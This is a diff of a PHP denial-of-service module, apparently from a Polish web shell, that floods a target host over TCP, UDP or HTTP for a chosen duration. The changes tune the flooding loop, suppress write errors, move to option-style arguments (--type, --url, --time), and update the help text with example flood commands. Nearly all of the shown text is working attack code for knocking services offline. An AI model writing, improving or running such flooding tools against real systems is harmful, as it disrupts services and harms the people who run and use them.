@@ -358,11 +358,11 @@ class Dos
 		$rConn = $this -> getConnection();
 
 		$i = 0;
-		$sPacket = str_repeat( 'x', 1472 );
+		$sPacket = str_repeat( 'x', 1400 );
 
 		do
 		{
-			if( ! fwrite( $rConn, $sPacket ) )
+			if( ! @ fwrite( $rConn, $sPacket ) )
 			{
 				$rConn = $this -> getConnection();
 			}
@@ -426,7 +426,7 @@ class Dos
 			{
 				$aCurlMulti[ $i ] = curl_multi_init();
 
-				for( $j = 0; $j < 160; $j++ )
+				for( $j = 0; $j < 160; ++$j )
 				{
 					$aCurl[ $j ] = curl_init();
 
@@ -436,7 +436,7 @@ class Dos
 
 				$iRes = 0;
 
-				for( $j = 0; $j < 500; $j++  )
+				for( $j = 0; $j < 500; ++$j  )
 				{
 					curl_multi_exec( $aCurlMulti[ $i ], $iRes );
 					usleep( 1000 );
@@ -551,7 +551,7 @@ class ModuleDos extends ModuleAbstract
 		/**
 		 * Wersja Data Autor
 		 */
-		return '1.03 2011-01-26 - <krzotr@gmail.com>';
+		return '1.04 2013-02-12 - <krzotr@gmail.com>';
 	}
 
 	/**
@@ -565,24 +565,24 @@ class ModuleDos extends ModuleAbstract
 		return <<<DATA
 Denial Of Service - floodowanie tcp, udp i http
 
-	Typ:
-		tcp
-		udp
-		http
+	Typ ataku:
+		--type=[tcp|udp|http]
 
-	Opcje:
+	Adres hosta wraz z portem lub pełen adres url
+		--[url|host]=127.0.0.1:9999
+
+	Czas trwania ataku, czas podawany jest w sekundach
+		--time=30
+
+	Dodatkowe opcje:
 		-n  wysłanie pakietu a następnie utworzenie nowego połączenia,
 		    przy wysłaniu 100MB mamy utworzonych 100 połączeń, bez tej opcji wszystkie dane
 		    zostaną wysłane przy pomocy jednego połączenia, dla 'http' połączenie będzie
 		    typu 'Keep-Alive' jeżeli jest dostępne
 
-	Użycie:
-		dos http http://localhost/auth/ czas_trwania_ataku_w_sekundach
-		dos typ host:port czas_trwania_ataku_w_sekundach
-
 	Przykład:
-		dos http http://localhost/auth/ 60
-		dos tcp localhost:80 60
+		dos --type=http --url=http://localhost/auth/ --time=30
+		dos --type=udp --url=127.0.0.1:9999 --time=30
 DATA;
 	}
 
@@ -602,15 +602,22 @@ DATA;
 			return 'dos, flood - !!! moduł nie został załadowany';
 		}
 
+		$sHost = $this -> oShell -> getArgs() -> getOption( 'host' ) ?: $this -> oShell -> getArgs() -> getOption( 'url' );
+		$sType = $this -> oShell -> getArgs() -> getOption( 'type' );
+		$iTime = (int) $this -> oShell -> getArgs() -> getOption( 'time' );
+
 		/**
 		 * Help
 		 */
-		if( $this -> oShell -> iArgc !== 3 )
+		if( ! $sHost || ! $sType || ! $iTime )
 		{
 			return $this -> getHelp();
 		}
 
-		header( 'Content-Type: text/plain; charset=utf-8' );
+		if( PHP_SAPI !== 'cli' )
+		{
+			header( 'Content-Type: text/plain; charset=utf-8' );
+		}
 
 		try
 		{
@@ -618,10 +625,10 @@ DATA;
 
 			$oDos = new Dos();
 			$oDos
-				-> setHost( $this -> oShell -> aArgv[1] )
-				-> setType( $this -> oShell -> aArgv[0] )
-				-> setTime( $this -> oShell -> aArgv[2] )
-				-> setNewConnection( in_array( 'n', $this -> oShell -> aOptv ) )
+				-> setHost( $sHost )
+				-> setType( $sType )
+				-> setTime( $iTime )
+				-> setNewConnection( $this -> oShell -> getArgs() -> getOption( 'n' ) )
 				-> get();
 
 			ob_end_flush();
